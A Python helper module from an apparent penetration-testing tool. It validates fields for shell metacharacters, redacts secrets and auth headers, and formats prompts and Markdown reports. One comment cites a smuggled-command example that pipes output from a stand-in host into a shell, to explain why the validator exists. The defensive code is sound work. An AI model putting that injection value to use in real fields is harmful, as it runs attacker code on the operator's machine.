"""Small text-composition helpers for prompt and report assembly.

The graph builds prompts from labelled sections and reports build Markdown from
the same shape; these two helpers are the shared kernel so neither hand-rolls
the empty-body guard or the blank-line join.
"""

from __future__ import annotations

import re
from collections.abc import Iterable

# Path/flag-safe characters for a cheatsheet-rendered field, and the stricter
# set for an output-filename label. The `cmd` renderer appends output_dir/flag/
# label UNQUOTED (so the operator's shell expands the sanctioned `$(date …)`/
# `${target}`); without this, a tools.json/commands.json field of
# `$(curl evil|sh)` would render a pasteable, "in scope" command that runs
# arbitrary code. See skuggi.tooling.commands and skuggi.tooling.registry.
_SAFE_FRAGMENT = re.compile(r"^[A-Za-z0-9_./=-]+$")
_SAFE_LABEL = re.compile(r"^[A-Za-z0-9_-]+$")


def safe_cmd_fragment(
    value: str | None, *, field: str, strict: bool = False
) -> str | None:
    """Reject shell metacharacters in a value the `cmd` renderer leaves unquoted.

    Empty/``None`` passes (the field is optional) and is returned unchanged so a
    ``None`` sentinel keeps its "fall back to the tool spec" meaning; otherwise
    the value must be wholly path-safe (``strict`` tightens it to a bare label:
    no ``/`` ``.`` ``=``). Raises ``ValueError`` so a bad spec fails at model load.
    """
    if value:
        pattern = _SAFE_LABEL if strict else _SAFE_FRAGMENT
        if not pattern.match(value):
            msg = f"{field} contains unsafe characters: {value!r}"
            raise ValueError(msg)
    return value


REDACTED = "***REDACTED***"
_MIN_SECRET_LEN = 8  # shorter values are too generic to mask without false hits

# An ``Authorization: …`` / ``X-Api-Key: …`` header line, and a ``Bearer <tok>``
# credential, anywhere in captured text. The engagement dashboard embeds raw
# command output and logs, so a header echoed by ``curl -v`` or a token in a
# traceback would otherwise land verbatim in an on-disk HTML artifact.
_AUTH_HEADER = re.compile(
    r"(?im)^(?P<head>\s*(?:proxy-)?authorization\s*:\s*|\s*x-api-key\s*:\s*).+$"
)
_BEARER = re.compile(r"(?i)\b(?P<kind>bearer|token)\s+[A-Za-z0-9._~+/=-]{8,}")


def redact_secrets(text: str, secrets: Iterable[str] = ()) -> str:
    """Mask known secret values and auth headers/bearer tokens in `text`.

    Used before captured output/logs are embedded in the engagement dashboard
    (an internal, on-disk artifact). ``secrets`` are exact values the harness
    holds (provider API keys); only values of 8+ chars are masked, so a short
    or empty key cannot blank out unrelated text.
    """
    if not text:
        return text
    for secret in secrets:
        if len(secret) >= _MIN_SECRET_LEN:
            text = text.replace(secret, REDACTED)
    text = _AUTH_HEADER.sub(lambda m: m.group("head") + REDACTED, text)
    return _BEARER.sub(lambda m: f"{m.group('kind')} {REDACTED}", text)


def split_matches(text: str, query: str) -> list[tuple[str, bool]]:
    """`text` split into ``(segment, is_match)`` runs over `query`'s hits.

    Every case-insensitive occurrence of `query` becomes its own
    ``(segment, True)`` run, the stretches between them ``(segment, False)``. An
    empty `query` (or no hit) yields a single non-match run of the whole string.
    This is the shared matcher behind both highlight forms -- the REPL's Rich
    markup (:func:`highlight`) and the daemon's styled spans
    (``render.highlight_spans``) -- so the two cannot drift.
    """
    if not query:
        return [(text, False)]
    low, needle = text.lower(), query.lower()
    span = len(query)
    runs: list[tuple[str, bool]] = []
    i = 0
    while (j := low.find(needle, i)) != -1:
        if j > i:
            runs.append((text[i:j], False))
        runs.append((text[j : j + span], True))
        i = j + span
    if i < len(text):
        runs.append((text[i:], False))
    return runs or [(text, False)]


def highlight(text: str, query: str, *, base: str, match: str) -> str:
    """Rich markup for `text` in style `base`, each hit of `query` in `match`.

    Every case-insensitive occurrence of `query` is repainted `match` so a
    search hit is visible in the listing (the `cmd` cheatsheet uses this to show
    WHY an entry matched). `text` is escaped so a literal ``[`` in it cannot open
    a spurious tag; an empty `query` simply paints the whole string `base`.
    """
    from rich.markup import escape  # noqa: PLC0415 -- keep this module import-light

    # Escape ONCE over the whole string, then split the ALREADY-SAFE string:
    # slicing an escaped string at the match boundaries keeps every literal
    # bracket escaped (a boundary cannot strand a `[` from its `\`), so each
    # wrapped run stays balanced markup. (The daemon's span form escapes per
    # segment at render time instead -- see ``render.highlight_spans``.)
    out: list[str] = []
    for segment, is_match in split_matches(escape(text), query):
        out.append(f"[{match}]{segment}[/{match}]" if is_match else segment)
    return f"[{base}]{''.join(out)}[/{base}]"


def labeled(label: str, body: str, *, heading: bool = False) -> str:
    """A labelled section, or '' when the body is blank.

    ``heading`` picks the format: a Markdown ``## label`` (reports) or a plain
    ``label:`` (prompts).
    """
    if not body.strip():
        return ""
    return f"## {label}\n\n{body}" if heading else f"{label}:\n{body}"


def join_blocks(*blocks: str) -> str:
    """Join non-empty blocks with a blank line between them."""
    return "\n\n".join(block for block in blocks if block)


def markdown_hardbreaks(text: str) -> str:
    """Make single newlines render as line breaks in Markdown, preserving blocks.

    ``rich.markdown.Markdown`` (CommonMark) treats a lone newline as a *soft* break
    and reflows it into a space, so an answer whose lines are separated by single
    newlines collapses into one run-on paragraph. This appends the Markdown
    hard-break marker (two trailing spaces) to a prose line that is immediately
    followed by another non-blank line -- but NEVER inside a fenced code block
    (where whitespace is literal), NEVER to a blank line (a real paragraph break),
    and never to a line that already ends in two spaces or a backslash. Blank-line
    paragraph breaks, lists and fenced code therefore render unchanged.
    """
    lines = text.split("\n")
    out: list[str] = []
    in_fence = False
    last = len(lines) - 1
    for i, line in enumerate(lines):
        stripped = line.lstrip()
        if stripped.startswith(("```", "~~~")):
            in_fence = not in_fence
            out.append(line)
            continue
        nxt = lines[i + 1] if i < last else ""
        if (
            not in_fence
            and i < last
            and line.strip()
            and nxt.strip()
            and not line.endswith("  ")
            and not line.endswith("\\")
        ):
            out.append(line + "  ")
        else:
            out.append(line)
    return "\n".join(out)


def slug(text: str) -> str:
    """A filesystem-safe slug for an output filename; ``"engagement"`` when empty.

    Shared by the report and visualization writers so the two output-filename
    conventions cannot drift.
    """
    return (
        "".join(c if c.isalnum() or c in "-_" else "-" for c in text).strip("-")
        or "engagement"
    )
